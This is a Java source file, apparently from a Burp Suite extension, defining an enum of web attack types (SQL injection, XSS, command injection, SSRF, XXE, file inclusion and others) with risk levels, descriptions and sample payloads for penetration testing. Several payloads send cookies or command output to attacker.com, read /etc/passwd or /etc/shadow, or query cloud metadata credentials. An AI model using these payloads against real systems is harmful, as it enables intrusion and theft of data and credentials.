package com.burpai.model;

import java.util.List;

/**
 * Enum representing known web attack types with descriptions and sample payloads.
 */
public enum AttackType {

    SQL_INJECTION(
            "SQL Injection",
            "HIGH",
            "The parameter may be incorporated into SQL queries without proper sanitization. "
                    + "An attacker could manipulate queries to read, modify, or delete database data, "
                    + "bypass authentication, or execute stored procedures.",
            List.of(
                    "' OR '1'='1",
                    "1' AND SLEEP(5)--",
                    "' UNION SELECT null,table_name FROM information_schema.tables--"
            )
    ),

    XSS(
            "Cross-Site Scripting (XSS)",
            "HIGH",
            "This parameter may allow injection of client-side scripts into pages seen by other users. "
                    + "An attacker could steal session cookies, redirect users, or perform actions on their behalf.",
            List.of(
                    "<script>alert(document.cookie)</script>",
                    "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>",
                    "\"><svg onload=alert(1)>"
            )
    ),

    COMMAND_INJECTION(
            "OS Command Injection",
            "CRITICAL",
            "This parameter may be passed to an OS shell command without sanitization. "
                    + "An attacker could execute arbitrary commands, read sensitive files, "
                    + "or take full control of the server.",
            List.of(
                    "; id",
                    "| cat /etc/passwd",
                    "`curl http://attacker.com/$(whoami)`"
            )
    ),

    PATH_TRAVERSAL(
            "Path / Directory Traversal",
            "HIGH",
            "This parameter may be used to construct file system paths. "
                    + "An attacker could traverse outside the intended directory and read "
                    + "sensitive files such as configuration or credential files.",
            List.of(
                    "../../etc/passwd",
                    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "....//....//etc/shadow"
            )
    ),

    SSRF(
            "Server-Side Request Forgery (SSRF)",
            "HIGH",
            "This parameter may cause the server to make outbound HTTP requests. "
                    + "An attacker could reach internal services, cloud metadata endpoints, "
                    + "or services behind firewalls.",
            List.of(
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "http://localhost:8080/admin",
                    "file:///etc/passwd"
            )
    ),

    OPEN_REDIRECT(
            "Open Redirect",
            "MEDIUM",
            "This parameter may control a redirect destination. "
                    + "An attacker could redirect users to a phishing site or bypass "
                    + "referrer-based security checks.",
            List.of(
                    "https://evil.com",
                    "//evil.com/%2F..",
                    "/\\evil.com"
            )
    ),

    SSTI(
            "Server-Side Template Injection (SSTI)",
            "CRITICAL",
            "This parameter may be rendered inside a server-side template engine. "
                    + "An attacker could execute arbitrary code on the server by injecting "
                    + "template directives.",
            List.of(
                    "{{7*7}}  (Jinja2/Twig – expect '49')",
                    "${7*7}  (Freemarker/Thymeleaf – expect '49')",
                    "<%= 7 * 7 %>  (ERB – expect '49')"
            )
    ),

    XXE(
            "XML External Entity Injection (XXE)",
            "HIGH",
            "The application may parse XML input with external entity resolution enabled. "
                    + "An attacker could read local files, perform SSRF, or trigger denial-of-service.",
            List.of(
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                    "<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;",
                    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>"
            )
    ),

    LDAP_INJECTION(
            "LDAP Injection",
            "HIGH",
            "This parameter may be inserted into LDAP filter expressions. "
                    + "An attacker could bypass authentication, extract directory information, "
                    + "or enumerate users.",
            List.of(
                    "*)(uid=*))(|(uid=*",
                    "admin)(&(password=*))",
                    "*)(|(objectClass=*)"
            )
    ),

    NOSQL_INJECTION(
            "NoSQL Injection",
            "HIGH",
            "This parameter may be used in a NoSQL query (e.g., MongoDB) without sanitization. "
                    + "An attacker could bypass authentication or exfiltrate data using operator injection.",
            List.of(
                    "{\"$gt\": \"\"}",
                    "{\"$where\": \"this.password.match(/.*/) || 1==1\"}",
                    "'; return true; var dummy='"
            )
    ),

    IDOR(
            "Insecure Direct Object Reference (IDOR)",
            "HIGH",
            "This parameter appears to reference an internal object (record, file, account) directly. "
                    + "An attacker could manipulate the value to access resources belonging to other users.",
            List.of(
                    "Increment / decrement: if id=42 try id=41, id=43",
                    "Negative or zero values: id=0, id=-1",
                    "Replace with another known or guessed user ID / UUID"
            )
    ),

    FILE_INCLUSION(
            "Local / Remote File Inclusion (LFI / RFI)",
            "CRITICAL",
            "This parameter may be used to include and execute files on the server. "
                    + "LFI allows reading local files; RFI allows executing remote scripts.",
            List.of(
                    "php://filter/convert.base64-encode/resource=index.php",
                    "/etc/passwd%00  (null-byte bypass for older PHP)",
                    "http://attacker.com/shell.txt"
            )
    ),

    HEADER_INJECTION(
            "HTTP Header Injection",
            "MEDIUM",
            "This parameter may be reflected back in HTTP response headers. "
                    + "An attacker could inject additional headers, split responses, "
                    + "or set arbitrary cookies.",
            List.of(
                    "value\\r\\nSet-Cookie: session=malicious",
                    "value%0d%0aLocation: https://evil.com",
                    "value\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK"
            )
    );

    private final String displayName;
    private final String riskLevel;
    private final String description;
    private final List<String> samplePayloads;

    AttackType(String displayName, String riskLevel, String description, List<String> samplePayloads) {
        this.displayName = displayName;
        this.riskLevel = riskLevel;
        this.description = description;
        this.samplePayloads = samplePayloads;
    }

    public String getDisplayName() { return displayName; }
    public String getRiskLevel()   { return riskLevel; }
    public String getDescription() { return description; }
    public List<String> getSamplePayloads() { return samplePayloads; }

    /** Returns a hex colour string suitable for Swing HTML based on risk level. */
    public String getRiskColour() {
        return switch (riskLevel) {
            case "CRITICAL" -> "#9b0000";
            case "HIGH"     -> "#cc3300";
            case "MEDIUM"   -> "#e67e00";
            default         -> "#666666";
        };
    }

    /** Returns an emoji indicator based on risk level. */
    public String getRiskEmoji() {
        return switch (riskLevel) {
            case "CRITICAL" -> "🔴";
            case "HIGH"     -> "🟠";
            case "MEDIUM"   -> "🟡";
            default         -> "⚪";
        };
    }
}
